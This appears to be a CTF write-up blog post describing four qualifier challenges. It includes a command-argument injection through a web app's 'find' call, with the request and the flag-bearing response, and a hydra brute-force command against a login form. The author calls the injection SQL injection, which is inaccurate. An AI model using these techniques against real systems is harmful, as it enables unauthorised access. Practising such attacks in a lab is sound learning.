@@ -1,0 +1,148 @@
+---
+title: 'Australian Cyber Battle Qualifiers - 2026'
+pubDate: 2026-05-25
+description: 'Notes and Reflections from the Cyber Battle CTF'
+author: 'edamamev'
+tags: ["ctf", "pentesting", "irl-event"]
+layout: ../../layouts/Post.astro
+---
+
+Alrighty~!
+
+## File Finder
+A SQL Injection vulnerability. We needed to construct an injection that returned
+the output of the flag found at `secret/flag.txt`.
+
+The backend of the web app uses the Unix command `find` to search for the files
+in its directory. `find` allows [command execution](https://gtfobins.org/gtfobins/find/),
+our payload will reflect that:
+
+We want to run this:
+
+`find . -exec cat secret/flag.txt`
+
+
+So this will be our payload:
+
+`. -exec cat secret/flag.txt ;`
+
+Formatted in the following HTTP request:
+```http
+GET /search?q=.&q=-exec&q=cat&q=secret/flag.txt&q=; HTTP/1.1
+Host: target01.s060.a2.crp.sh:3001
+Accept-Language: en-US,en;q=0.9
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
+Accept: */*
+Referer: http://target01.s060.a2.crp.sh:3001/
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive
+
+```
+
+
+Which returned:
+```http
+HTTP/1.1 200 OK
+X-Powered-By: Express
+Content-Type: text/html; charset=utf-8
+Content-Length: 44
+ETag: W/"2c-cWni6HEcA+4gPNzpwaIvCRiKH9o"
+Date: Sat, 16 May 2026 00:46:45 GMT
+Connection: keep-alive
+Keep-Alive: timeout=5
+
+ctftech{why-4re-ysadas0u-re4d1ng-this-bb91}
+```
+Sweet! That's one down :D
+
+## Rock and Roll 
+Rockstar esolang lmaooooooo
+
+```Rockstar
+You are nearly there
+The whispers are awaiting the finale
+
+The flag is at your fingertips
+Your time is not wasted
+
+Let the whispers be with you
+Possibilities are endless with them
+
+Let close be the whispers of possibilities
+The wait takes ages
+While ages is less than close without you
+let ages be with the flag
+
+Let the punishment be ages
+Return the punishment
+
+Let the road be the wait taking your time
+Let the flag be close with the road
+
+The challenges are difficult; in the end
+it's always worth it. When
+the solution is on your screen and you finally
+shout the flag
+```
+Using the [compiler](https://codewithrockstar.com/online.html), it outputs:
+`934249`
+
+Annnnnnd that's another flag ^^
+## Bricks
+Havent' mucked with `hydra` much, but this exercise helped me with that. I
+didn't end up getting the flag for this challenge, but I learnt a lot.
+
+**Situation**
+
+Billy has a username `Billy24`, but forgot his PIN. There are 4 LEGO
+bricks that act as his reminder for it. Find out his PIN.
+
+**What I Did**
+
+There were four bricks displayed. I mistakenly thought that each one represented
+a single number, so I thought it's be easier to brute force it.
+1. I created a shell script that created `bwa.md`, containing every
+four digit combination `0000` to `9999`.
+1. Created a `hydra` command to target the `http-post-form`:
+
+```sh
+hydra -l Billy24 -P bwa.md -u -s 5051 target01.s060.a2.crp.sh http-post-form "/login:username=^USER^&password=^PASS^:Invalid Credentials!" -V 
+```
+3. Waited.
+4. It didn't work xD
+
+So I moved on, not sure how to move forward with this challenge.
+
+**Solution**
+
+This was an OSINT challenge. Each LEGO brick has an ID number, and placing the
+four IDs in the order the bricks were displayed would unlock Billy's account.
+
+
+## Blind Letter
+A `.txt` document with a six-pointed ascii star with the following string of
+characters in the centre
+```
+⠼⠊⠼⠑⠼⠃⠼⠑⠼⠓⠼⠋⠼⠋⠼⠋⠼⠙⠼⠊⠼⠙⠼⠚⠼⠚⠼⠓⠼⠉⠼⠛⠼⠊⠼⠚⠼⠋⠼⠉⠼⠛⠼⠊⠼⠃⠼⠃⠼⠁⠼⠉⠼⠙⠼⠊⠼⠚⠼⠃⠼⠙⠼⠚⠼⠙⠼⠊⠼⠚⠼⠃⠼⠑⠼⠚⠼⠋⠼⠉⠼⠊⠼⠛⠼⠃⠼⠉⠼⠃⠼⠑⠼⠃⠼⠊⠼⠛⠼⠑⠼⠁⠼⠛⠼⠋⠼⠊⠼⠉
+```
+My text editor rendered the text as Braille, so I placed them into a braille
+converter and it outputted:
+
+`9525866649400837906379221349024049025063972325297517693`
+
+I recognised this as a `BigInt` value type. Thank goodness I started doing
+[Cryptohack](https:cryptohack.org) xP
+
+```
+BigInt -> Hex -> ASCII
+```
+..I put this into Claude, and it did the conversions necesssary to output the flag:
+`ctftech{BlinD_a5_4_B4t}`
+
+## Closing~
+There were 20 Challenges total in the CTF. The top team in the nation completed 15,
+the top team in our state completed 11, and I completed 3 flags for my team individually.
+
+For my first CTF event, I'm pretty chuffed with how I performed.
+
+Thanks for reading!
